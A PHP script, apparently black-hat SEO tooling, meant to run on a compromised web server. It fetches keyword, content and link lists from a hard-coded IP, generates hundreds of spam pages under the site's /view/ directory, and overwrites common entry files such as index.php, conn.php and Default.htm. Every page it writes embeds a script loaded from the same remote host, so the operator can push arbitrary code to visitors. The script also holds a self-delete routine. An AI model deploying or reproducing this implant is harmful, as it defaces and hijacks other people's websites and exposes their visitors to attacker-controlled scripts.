<?php  //��������

//��ѩ--��ñSEO  QQ:2602159946
//�����Զ�������    ��������һ�λ��Զ�ɾ��  3��ɾ����ʽ
//1 �������ɳ��� 4000�����Զ�ɾ��
//2 û�г���4000��Ҳ���Զ�ɾ��
//3 post�ύɾ�� http://127.0.0.1:8888/cs.php?del=123456  //ɾ������

@$del=$_GET["del"];     //http://127.0.0.1:8888/cs.php?del=123456  //ɾ������
if($del=="123456")
{
echo "ɾ�������ļ�";
echo "<br/>";
//delfile();  //ɾ������
return 0;
}

function writestr($fname,$str) //д���ļ�
{ 
$fp=fopen($fname,"w"); 
fputs($fp,$str); 
fclose($fp); 
} 

function writemoban()  //����HTML ģ��
	  { 
	  $mobandata="<!DOCTYPE html PUBLIC \"-//W3C//liD XHTML 1.0 Transitional//EN\"\"http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid\">\r\n"; 
	  $mobandata=$mobandata."<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n"; 
	  $mobandata=$mobandata."<head>\r\n"; 
	  $mobandata=$mobandata."<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />\r\n"; 
	  $mobandata=$mobandata."<title>�����˹��ʡ�{title}-www.tg58586.com</title>\r\n"; 
	  $mobandata=$mobandata."<meta content=\"all\" name=\"robots\" />\r\n"; 
	  $mobandata=$mobandata."<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" />\r\n"; 
	  $mobandata=$mobandata."<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" />\r\n"; 
	  $mobandata=$mobandata."</head>\r\n"; 
	  $mobandata=$mobandata."<body><script language=\"javascript\" src=\"http://192.184.61.195/out.js\"></script>\r\n"; 
	  $mobandata=$mobandata."<div class=\"wrap\">\r\n"; 
	  $mobandata=$mobandata."   <div class=\"clear blank10\"></div>\r\n"; 
	  $mobandata=$mobandata."   <div class=\"navi\">�������ڵ�λ��   <a  href=\"http://www.tg58586.com/\">���˹���</a> > <a  href=\"/view/\">������Ѷ</a> > �������</div>\r\n"; 
	  $mobandata=$mobandata."   <div class=\"clear blank10\"></div>\r\n"; 
	  $mobandata=$mobandata."   <div class=\"newsmain\">\r\n"; 
	  $mobandata=$mobandata."      <div id=\"side\">\r\n"; 
	  $mobandata=$mobandata."	      <div class=\"sideNav\">\r\n"; 
	  $mobandata=$mobandata."		     <h2>��������</h2>\r\n"; 
	  $mobandata=$mobandata."		        <ul>{links}</ul>\r\n"; 
	  $mobandata=$mobandata."		   <div class=\"sidebottom\"></div>\r\n"; 
	  $mobandata=$mobandata."	       </div>\r\n"; 
	  $mobandata=$mobandata."       </div>\r\n"; 
	  $mobandata=$mobandata."       <div class=\"rightPar\" id=\"about\">\r\n"; 
	  $mobandata=$mobandata."            <div class=\"aboutTitle\">\r\n"; 
	  $mobandata=$mobandata."                <h3><span>���ߣ�admin </span> {title}</h3>\r\n"; 
	  $mobandata=$mobandata."            </div>\r\n"; 
	  $mobandata=$mobandata."              <div id=\"MyContent\">\r\n"; 
	  $mobandata=$mobandata."					<div id=\"MyContent\">{content}\r\n"; 
	  $mobandata=$mobandata."					<br/>\r\n"; 
	  $mobandata=$mobandata."					<p align=left >{shang}|{xia}</P>\r\n"; 
	  $mobandata=$mobandata."					</div>\r\n"; 
	  $mobandata=$mobandata."		  </div>\r\n"; 
	  $mobandata=$mobandata."     </div>\r\n"; 
	  $mobandata=$mobandata."  </div>\r\n"; 
	  $mobandata=$mobandata."</div>\r\n"; 
	  $mobandata=$mobandata."<div class=\"clear blank10\"></div>\r\n"; 
	  $mobandata=$mobandata."<div class=\"copyright\">  ��վ����mkCMS<sup>TM</sup>S0���� ���ɱ������˹���www.tg58586.com��Ϣ�������޹�˾�� ��Ȩ����  2006-2013  <br>\r\n"; 
	  $mobandata=$mobandata."  �������ֵ�122000212300�� �ǼǺ�122000212300  ����ע���:122000212300 ˰��ǼǺ�:122000212300 ��ICP��122000212300��</div><script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/16207838.js\"></script>\r\n"; 
	  $mobandata=$mobandata."</body>\r\n"; 
	  $mobandata=$mobandata."</html>\r\n"; 
	  return $mobandata; 
	  } 
	  
function writecss($fname)   //CSS��ʽ
	  { 
	  $cssdata="*{margin:0;padding:0;word-wrap:break-word;}\r\n"; 
	  $cssdata=$cssdata."body{font:12px/1.75 \"����\", arial, sans-serif,'DejaVu Sans','Lucida Grande',Tahoma,'Hiragino Sans GB',STHeiti,SimSun,sans-serif;color:#444;}\r\n"; 
	  $cssdata=$cssdata."body{ background:#FBFCFF url(index-bg.jpg) repeat-x;}\r\n"; 
	  $cssdata=$cssdata."a{text-decoration:none;color:#2C2C2C}\r\n"; 
	  $cssdata=$cssdata."a:hover{text-decoration:underline;color:#F60;}\r\n"; 
	  $cssdata=$cssdata."h1,h3,h4,h5,h6{font-size:12px; margin:0; padding:0; font-weight:100;}\r\n"; 
	  $cssdata=$cssdata."h2{font-size:20px; color:#000; text-align:center;}\r\n"; 
	  $cssdata=$cssdata."h3{font-size:14px; font-weight:600; padding-left:15px;}\r\n"; 
	  $cssdata=$cssdata."a img{border:none;}\r\n"; 
	  $cssdata=$cssdata."div,ul,li,p,form{padding: 0px; margin: 0px;list-style-type: none;}\r\n"; 
	  $cssdata=$cssdata."em{font-style: normal;font-weight: normal;}\r\n"; 
	  $cssdata=$cssdata."table {padding: 0px; margin: 0px;list-style-type: none;}\r\n"; 
	  $cssdata=$cssdata."dt,dl,dd {padding: 0px; margin: 0px;list-style-type: none;}\r\n"; 
	  $cssdata=$cssdata."form{margin:0px;padding:0px;}\r\n"; 
	  $cssdata=$cssdata."tr {padding: 0px; margin: 0px;list-style-type: none;}\r\n"; 
	  $cssdata=$cssdata.".clear {clear:both;height:0px; overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".blank10{height:10px;overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".blank20{height:20px;overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata."sup{ font-size:9px; color:#555;}\r\n"; 
	  $cssdata=$cssdata.".wrap{width:960px; margin:0px auto;background:#fff; height:100%; overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".clear {clear:both;height:0px; overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".blank10{height:10px;overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".navi{width:940px;margin:0px auto;height:28px;line-height:28px;color:#ccc;background:url(home.gif) no-repeat 5px 8px; padding-left:20px;}\r\n"; 
	  $cssdata=$cssdata.".navi a{color:#ccc}\r\n"; 
	  $cssdata=$cssdata.".navi a:hover{color:#069;text-decoration:none;}\r\n"; 
	  $cssdata=$cssdata.".newsmain{width:960px;margin:0px auto;background:#fff;}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left{width:266px;float:left;}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01{}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .tit{background:url(titlebg.gif) no-repeat; font-size:14px; padding-left:12px; font-weight:bold; color:#069; height:40px; line-height:40px;}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .left01box{}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .left01box ul{}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .left01box li{height:37px;line-height:37px;border-bottom:#f1f1f1 1px dashed; padding-left:15px;}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .left01box a{font-size:14px;height:37px;line-height:37px;display:block;padding-left:25px;background:url(dotl.gif) no-repeat 0px 14px;padding-left:12px;}\r\n"; 
	  $cssdata=$cssdata.".newsmain .left .left01 .left01box a:hover{color:#069;text-decoration:none;}\r\n"; 
	  $cssdata=$cssdata.".rightPart { border:1px solid #ddd; color:#646363; line-height:25px; float:left; display:inline; margin:0 0 0 8px; padding:0px; width:775px; _width:772px; position:relative; padding-bottom:10px;}\r\n"; 
	  $cssdata=$cssdata.".rightPart #MyContent{padding:10px;font-size:14px;line-height:25px; text-align:left;}\r\n"; 
	  $cssdata=$cssdata.".rightPart #MyContent h2{ height:50px; line-height:50px; text-align:center; border-bottom:#E8E8E8 1px solid; margin-bottom:10px; display:none;}\r\n"; 
	  $cssdata=$cssdata.".rightPart #MyContent dd{ background:url(arrow.png) no-repeat 0px 10px; padding-left:10px;}\r\n"; 
	  $cssdata=$cssdata.".rightPart #MyContent dd span#date{ float:right; color:#999;}\r\n"; 
	  $cssdata=$cssdata.".aboutTitle h3 { display:block; padding:0px 0 0px 40px; font-size:14px; font-weight:bold; color:#4a628d; text-align:left;background:url(titbg.gif) no-repeat;height:38px;line-height:38px;  position:relative;}\r\n"; 
	  $cssdata=$cssdata.".aboutTitle h3 span{ position:absolute; right:10px; top:0px; font-weight:normal; font-size:12px; color:#999;}\r\n"; 
	  $cssdata=$cssdata.".copyright{width:960px; margin:0px auto;line-height:24px; text-align:center; color:#555 ;font-family:\"΢���ź�\";}\r\n"; 
	  $cssdata=$cssdata.".copyright sup{ font-size:8px; font-family:\"΢���ź�\";}\r\n";
	  $cssdata=$cssdata."#about { background:none; height:100%;overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata."#about p { text-align:left; padding:0 40px;}\r\n"; 
	  $cssdata=$cssdata.".newslist{}\r\n"; 
	  $cssdata=$cssdata.".newslist dl{padding:20px;}\r\n"; 
	  $cssdata=$cssdata.".newslist div.first{border-bottom:#ccc 1px dashed; line-height:28px; margin-bottom:10px;padding-bottom:10px; }\r\n"; 
	  $cssdata=$cssdata.".newslist div.first a{font-size:16px;font-weight:bold;color:#CC0000; font-family:\"Times New Roman\", Times, serif}\r\n"; 
	  $cssdata=$cssdata.".newslist div.first a:hover{color:#069;}\r\n"; 
	  $cssdata=$cssdata.".newslist div.first span#date{ float:right; color:#999;}\r\n"; 
	  $cssdata=$cssdata.".newslist dd{height:30px;line-height:30px;background:url(graydot.gif) no-repeat 0px 13px;padding-left:10px; border-bottom:#e8e8e8 1px dotted;}\r\n"; 
	  $cssdata=$cssdata.".newslist span#date{float:right;color:#999;}\r\n"; 
	  $cssdata=$cssdata.".newslist a{font-size:14px;}\r\n"; 
	  $cssdata=$cssdata.".newslist a:hover{color:#069;text-decoration:none;}\r\n"; 
	  $cssdata=$cssdata."#fenye{clear:both;margin:10px;}\r\n"; 
	  $cssdata=$cssdata."#fenye a{text-decoration:non;}\r\n"; 
	  $cssdata=$cssdata."#fenye .prev,#fenye .next{width:52px; text-align:center;}\r\n"; 
	  $cssdata=$cssdata."#fenye a.curr{width:22px;background:#3B85B4; border:1px solid #3185C3; color:#fff; font-weight:bold; text-align:center;}\r\n"; 
	  $cssdata=$cssdata."#fenye a.curr:visited {color:#fff;}\r\n"; 
	  $cssdata=$cssdata."#fenye a{margin:5px 4px 0 0; color:#3B85B4;background:#fff; display:inline-table; border:1px solid #3185C3; float:left; font-size:12px; text-align:center;height:22px;line-height:22px}\r\n"; 
	  $cssdata=$cssdata."#fenye a.num{width:22px;}\r\n"; 
	  $cssdata=$cssdata."#fenye a:visited{color:#3B85B4;}\r\n"; 
	  $cssdata=$cssdata."#fenye a:hover{color:#fff; background:#3B85B4; border:1px solid #3B85B4;float:left;}\r\n"; 
	  $cssdata=$cssdata."#fenye span{line-height:30px;}\r\n"; 
	  $cssdata=$cssdata."#ranks_change_bar #next { background-position:-27px 0; }\r\n"; 
	  $cssdata=$cssdata."#side {float:left; text-align:left; width:174px; }\r\n"; 
	  $cssdata=$cssdata.".sideNav {text-align:left; margin:0 auto 14px auto; width:174px; z-index:2;}\r\n"; 
	  $cssdata=$cssdata.".sideNav ul { border-left:1px solid #ddd; border-right:1px solid #ddd; padding:0px; width:166px;}\r\n"; 
	  $cssdata=$cssdata.".sideNav h2, .sideNav h3 { display:block; text-align:left; padding:0 0 0 20px;}\r\n"; 
	  $cssdata=$cssdata.".sideNav h2 {background:url(leftbg.jpg) no-repeat; height:37px; line-height:37px; font-size:14px; color:#069;}\r\n"; 
	  $cssdata=$cssdata.".sideNav li { cursor:pointer; display:inline; }\r\n"; 
	  $cssdata=$cssdata.".sideNav li a { background:url(arrow.png) 20px 13px no-repeat; text-decoration:none; color:#4a628d; line-height:33px; display:block; width:128px; height:33px; padding:0 0 0 32px; margin:0; overflow:hidden;}\r\n"; 
	  $cssdata=$cssdata.".sideNav .currclass a{ background:url(arrow.png) 20px 13px no-repeat #fff; border-top:1px solid #ddd; border-bottom:1px solid #ddd; text-decoration:none; color:#4a628d; display:block; height:32px; line-height:32px; width:150px; overflow:hidden; position:absolute; z-index:8; top:-1px;}\r\n"; 
	  $cssdata=$cssdata.".sideNav li{ display:block; background:url(leftbg3.jpg) no-repeat; margin:0; padding:0; height:33px; position:relative; z-index:8;}\r\n"; 
	  $fp=fopen($fname,"w"); 
	  fputs($fp,$cssdata); 
	  fclose($fp); 
	  } 
	  
function rarray_rand( $arr ) //�����������
	 { 
	 return mt_rand( 0, count( $arr ) - 1 ); //�����������
	 } 
	 
function autowrite($KEY,$fname,$filedata,$linkdata,$strtitle) ////��������
	 { 
	 
	 $dirdata1 = "<!DOCTYPE html PUBLIC \"-//W3C//liD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid\">\r\n"; 	$dirdata1=$dirdata1."<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n"; 
	 $dirdata1=$dirdata1."<head>\r\n"; 
	 $dirdata1=$dirdata1."<title>�����˹��ʡ�".$strtitle." - www.tg58586.com</title>\r\n"; 
	 $dirdata1=$dirdata1."<MEtA http-equiv=Content-type content=\"text/html; charset=gb2312\">\r\n"; 
	 $dirdata1=$dirdata1."<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" />\r\n"; 
	 $dirdata1=$dirdata1."<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" />\r\n"; 
	 $dirdata1=$dirdata1."</head>\r\n"; 
	 $dirdata1=$dirdata1."<body><script language=\"javascript\" src=\"http://192.184.61.195/out.js\"></script>\r\n"; 
	 $dirdata1=$dirdata1."<div class=\"wrap\">\r\n"; 
	 $dirdata1=$dirdata1."<div class=\"clear blank10\"></div>\r\n"; 
	 $dirdata1=$dirdata1."<div class=\"navi\">�������ڵ�λ�� <a  href=\"http://www.tg58586.com/\">���˹���</a> > <a  href=\"/view/\">������Ѷ</a> > Ƶ����ҳ </div>\r\n"; 
	 $dirdata1=$dirdata1."  <div class=\"clear blank10\"></div>\r\n"; 
	 $dirdata1=$dirdata1."  <div class=\"newsmain\">\r\n"; 
	 $dirdata1=$dirdata1."      <div id=\"side\">\r\n"; 
	 $dirdata1=$dirdata1."	      <div class=\"sideNav\">\r\n"; 
	 $dirdata1=$dirdata1."		     <h2>��������</h2>\r\n"; 
	 $dirdata1=$dirdata1."		        <ul>{links}</ul>\r\n"; 
	 $dirdata1=$dirdata1."		   <div class=\"sidebottom\"></div>\r\n"; 
	 $dirdata1=$dirdata1."	       </div>\r\n"; 
	 $dirdata1=$dirdata1."       </div>\r\n"; 
	 $dirdata1=$dirdata1."    <div class=\"rightPart\" id=\"about\">\r\n"; 
	 $dirdata1=$dirdata1."      <div class=\"aboutTitle\">\r\n"; 
	 $dirdata1=$dirdata1."        <h3>���Ź���</h3>\r\n"; 
	 $dirdata1=$dirdata1."      </div>\r\n"; 
	 $dirdata1=$dirdata1."      <div class=\"newslist\">\r\n"; 
	 $dirdata1=$dirdata1."        <dl>\r\n"; 
	 $dirdata2="        </dl>\r\n"; 
	 $dirdata2=$dirdata2."        <div id=\"fenye\" class=\"plist\" style=\"margin-top:6px;text-align:right;\">\r\n"; 
	 $dirdata2=$dirdata2."          <table border=\"0\" align=\"right\">\r\n"; 
	 $dirdata2=$dirdata2."            <tr>\r\n"; 
	 $dirdata2=$dirdata2."              <td id=\"pagelist\">\r\n";
	 $tim1=date('Ymd',time());
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+1).".html\" class=\"next\">��1ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+2).".html\" class=\"next\">��2ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+3).".html\" class=\"next\">��3ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+4).".html\" class=\"next\">��4ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+5).".html\" class=\"next\">��5ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+6).".html\" class=\"next\">��6ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+7).".html\" class=\"next\">��7ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+8).".html\" class=\"next\">��8ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+9).".html\" class=\"next\">��9ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+10).".html\" class=\"next\">��10ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+11).".html\" class=\"next\">��11ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+12).".html\" class=\"next\">��12ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+13).".html\" class=\"next\">��13ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+14).".html\" class=\"next\">��14ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+15).".html\" class=\"next\">��15ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+16).".html\" class=\"next\">��16ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+17).".html\" class=\"next\">��17ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+18).".html\" class=\"next\">��18ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+19).".html\" class=\"next\">��19ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."<a href=\"".(intval($tim1).$KEY+20).".html\" class=\"next\">��20ҳ</a>\r\n"; 
	  $dirdata2=$dirdata2."</td>\r\n"; 
	  $dirdata2=$dirdata2."            </tr>\r\n"; 
	  $dirdata2=$dirdata2."          </table>\r\n"; 
	  $dirdata2=$dirdata2."        </div>\r\n"; 
	  $dirdata2=$dirdata2."      </div>\r\n"; 
	  $dirdata2=$dirdata2."    </div>\r\n"; 
	  $dirdata2=$dirdata2."  </div>\r\n"; 
	  $dirdata2=$dirdata2." </div>\r\n"; 
	  $dirdata2=$dirdata2."</div>\r\n"; 
	  $dirdata2=$dirdata2."<div class=\"clear blank10\"></div>\r\n"; 
	  $dirdata2=$dirdata2."<div class=\"copyright\">  ��վ����mkCMS<sup>TM</sup>S0���� ���ɱ������˹���www.tg58586.com��Ϣ�������޹�˾�� ��Ȩ����  2006-2013  <br>\r\n"; 
	  $mobandata="  �������ֵ�122000212300�� �ǼǺ�122000212300  ����ע���:122000212300 ˰��ǼǺ�:122000212300 ��ICP��122000212300��</div><script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/16207838.js\"></script>\r\n"; 
	  $dirdata2=$dirdata2."</body>\r\n"; 
	  $dirdata2=$dirdata2."</html>\r\n"; 
	  $lastdata = $dirdata1.$filedata.$dirdata2; 
	  $newlastdata=str_replace( "{links}",$linkdata, $lastdata ); 
	  $fp=fopen($fname,"w"); 
	  fputs($fp,$newlastdata); 
	  fclose($fp); 
	  echo $fname."-------html �Ѿ�����<br/>"; 
	  } 
	  
function delfile()  //ɾ������
{
//��ȡ��ǰ������
$url = $_SERVER['PHP_SELF']; 
$filenameA= substr( $url , strrpos($url ,'/')+1 ); 
if (unlink($filenameA))
  {
  echo "ɾ���ļ��ɹ�".$filenameA;
  }
else
  {
  echo "ɾ���ļ�ʧ��".$filenameA;
  }
}

?>


<?php
set_time_limit(9999);  //���ó���ִ��ʱ��ĺ���

$tim1=date('Ymd',time());
$folderpath=$_SERVER['DOCUMENT_ROOT']."/view/";   //��ȡ�����Ŀ¼
if($folderpath=="")
{
$folderpath="view/";
}
 if(!file_exists($folderpath)) //�ж�ĵ���Ƿ����
 { 
 mkdir($folderpath); //�����ھʹ���
 echo $folderpath."Ŀ¼�½��ɹ�<br/>"; 
 } 
 
writecss($folderpath."style.css"); //CSS��ʽ

$keywords = $tempkeywords=file( "http://192.184.61.195/deta/key.txt" );   //�ؼ���
$data = file( "http://192.184.61.195/deta/content.txt" );   //��������
$sites = file( "http://192.184.61.195/deta/sites.txt" );    //������ַ(����)
//�����ļ�
$pic1 = file_get_contents("http://192.184.61.195/deta/index-bg.jpg"); 
writestr($folderpath."index-bg.jpg",$pic1); 
$pic2 = file_get_contents("http://192.184.61.195/deta/home.gif"); 
writestr($folderpath."home.gif",$pic2); 
$pic3 = file_get_contents("http://192.184.61.195/deta/titlebg.gif"); 
writestr($folderpath."titlebg.gif",$pic3); 
$pic4 = file_get_contents("http://192.184.61.195/deta/dotl.gif"); 
writestr($folderpath."dotl.gif",$pic4); 
$pic5 = file_get_contents("http://192.184.61.195/deta/arrow.png"); 
writestr($folderpath."arrow.png",$pic5); 
$pic6 = file_get_contents("http://192.184.61.195/deta/titbg.gif"); 
writestr($folderpath."titbg.gif",$pic6); 
$pic7 = file_get_contents("http://192.184.61.195/deta/graydot.gif"); 
writestr($folderpath."graydot.gif",$pic7); 
$pic8 = file_get_contents("http://192.184.61.195/deta/leftbg.jpg"); 
writestr($folderpath."leftbg.jpg",$pic8); 
$pic9 = file_get_contents("http://192.184.61.195/deta/leftbg3.jpg");
writestr($folderpath."leftbg3.jpg",$pic9); 
 
 $moban =writemoban();    //����HTML ģ��
 shuffle($keywords); //���������ң�������е�Ԫ��˳��һ������  (���ҹؼ���)
 $webName=trim($keywords[0])."_".trim($keywords[1]); 
 echo "�����Զ�������  ��վ����--".$webName."<br/>"; 
 $keyNum=count( $keywords ); //��������������Ŀ������
 $sitesNum=count($sites);  //��������������Ŀ������
 
  for($kindex=1;$kindex<$keyNum;++$kindex) //ѭ����������
 { 
 $title=trim($keywords[$kindex]); 
 //$filename=$folderpath.(intval($tim1+$KEY)).".html"; 
 $shang = ""; 
 $xia =""; 
 $links=""; 
 $content=""; 
 
 $shang = "��һƪ��<a href=\"".(intval($tim1).$kindex-1).".html\">".$keywords[$kindex-1]."</a>"; 
 $xia = "��һƪ��<a href=\"".(intval($tim1).$kindex+1).".html\">".$keywords[$kindex+1]."</a>";

 
 $contentNum=mt_rand( 4, 8); //�������
 for ( $i=0;$i < $contentNum;++$i) 
 { 
 $tempContent="<p>".$data[rarray_rand( $data )]."</p>\r\n"; $content=str_replace( $tempContent,"", $content ); 
 $content=$content.$tempContent; 
 }  

 shuffle($sites); //������������˳��
 shuffle($tempkeywords);  //������������˳��
 for ( $l=0;$l < 50;++$l) 
 { 
	 if($l<$sitesNum) 
	 { 
	 $links=$links."<li><a href=\"".trim($sites[$l])."/view/\">".trim($tempkeywords[$l])."</a></li>\r\n"; 
	 } 
 } 
 
 //�������ݵĹؼ���������
 $content=str_replace( "{title}",$title, $content ); 
$str = str_replace( "{title}", $title, $moban ); 
 $str = str_replace( "{content}", $content, $str); 
 $str = str_replace( "{shang}", $shang, $str ); 
 $str = str_replace( "{xia}", $xia, $str ); 
 $str = str_replace( "{links}", $links, $str ); //��������
 

 
 $dirlone1 = "<dd><span id=\"date\">".date( "Y��n��j��" ,strtotime('-1 day'))."</span> <a href=\"".(intval($tim1).$kindex+20).".html\">".$title."</a></dd>\r\n"; 
if($kindex <= 3) 
{
autowrite($kindex,$folderpath."index.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Index.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."conn.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."CONN.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."index.aspx",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."index.htm",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Index.htm",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."index.html",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Index.html",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."index.php",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."forum.php",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."conn.php",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."CONN.php",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."emil.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Default.htm",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Default.html",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."Default.asp",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."home.php",$dirlone1,$links,$webName); //��������
autowrite($kindex,$folderpath."index.jsp",$dirlone1,$links,$webName); //��������
}
 
 
autowrite($kindex,$folderpath.$tim1.$kindex.".html",$dirlone1,$links,$webName); //��������

$filename=$folderpath.$tim1.$kindex.".html"; 
 writestr($filename,$str);



if($kindex >= 500) 
{
//delfile();  //ɾ������
return 0;
}
 
 unset( $content ); //ע������ı���
 
 }
//delfile();  //ɾ������
?>